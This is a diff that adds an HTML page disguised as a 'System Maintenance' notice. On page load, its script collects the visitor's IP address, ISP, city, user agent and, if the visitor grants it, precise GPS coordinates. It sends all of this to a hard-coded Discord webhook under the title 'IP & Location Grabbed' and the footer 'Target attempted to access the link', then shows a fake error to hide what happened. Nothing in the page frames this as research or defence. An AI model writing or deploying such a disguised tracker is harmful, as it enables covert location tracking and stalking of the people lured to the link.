@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update Required</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 300px;
+        }
+        h2 { color: #333; }
+        p { color: #666; font-size: 14px; }
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .status { margin-top: 10px; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>System Maintenance</h2>
+        <p>This page is undergoing scheduled maintenance. Please do not refresh.</p>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1517535309796081686/Ijsk5jE4ZzjrpiED8Iy2cJHJFLrGfax8LZjIIN7fQg8n_xOwKZg3Czd3-fOIEoQS-RXT"; 
+        // --------------------------------------------------
+
+        const statusDiv = document.getElementById('status');
+
+        function sendWebhook(data) {
+            statusDiv.innerText = "Connecting...";
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: null, // No message ping
+                    embeds: [{
+                        title: "🚨 IP & Location Grabbed",
+                        color: 15158332, // Red
+                        fields: [
+                            { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                            { name: "Location", value: data.location || "Unknown", inline: true },
+                            { name: "ISP/Organization", value: data.isp || "Unknown", inline: false },
+                            { name: "Device Info", value: data.device, inline: false }
+                        ],
+                        footer: { text: "Target attempted to access the link" }
+                    }]
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.innerText = "Connection failed. Please try again later.";
+                } else {
+                    statusDiv.innerText = "Error connecting.";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusDiv.innerText = "Error.";
+            });
+        }
+
+        function getLocationAndSend(ipData) {
+            statusDiv.innerText = "Locating...";
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success: Got precise GPS
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const preciseLocation = `GPS: ${lat}, ${lon}`;
+                        
+                        sendWebhook({
+                            ip: ipData.ip,
+                            location: preciseLocation,
+                            isp: ipData.isp,
+                            device: navigator.userAgent
+                        });
+                    },
+                    (error) => {
+                        // Error: User denied permission or error occurred
+                        // Fall back to IP data only
+                        sendWebhook({
+                            ip: ipData.ip,
+                            location: "GPS Denied (IP Only)",
+                            isp: ipData.isp,
+                            device: navigator.userAgent
+                        });
+                    }
+                );
+            } else {
+                // Browser doesn't support geolocation
+                sendWebhook({
+                    ip: ipData.ip,
+                    location: "GPS Not Supported",
+                    isp: ipData.isp,
+                    device: navigator.userAgent
+                });
+            }
+        }
+
+        // Start the process by getting IP info first
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                // We have the IP info, now try to get GPS
+                getLocationAndSend({
+                    ip: data.ip,
+                    isp: data.org,
+                    location: `${data.city}, ${data.region}, ${data.country_name}`
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                statusDiv.innerText = "System Error.";
+            });
+    </script>
+</body>
+</html>
